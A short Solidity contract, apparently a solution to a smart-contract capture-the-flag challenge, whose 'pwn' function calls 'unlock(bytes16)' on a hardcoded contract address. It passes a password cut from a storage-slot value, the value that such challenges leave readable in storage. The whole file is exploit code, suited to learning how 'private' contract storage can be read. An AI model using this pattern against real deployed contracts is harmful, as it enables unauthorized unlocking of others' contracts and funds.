// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract Bytes16 {
    bytes32 storageSlot =
        0x0000000000000000000000000000000000000000000000000000000000000000;
    bytes16 pass = bytes16(storageSlot);

    function pwn() public {
        0xefb8553cc41A72Ef7901a9a925bDc36Ca487a902.call(
            abi.encodeWithSignature("unlock(bytes16)", pass)
        );
    }
}
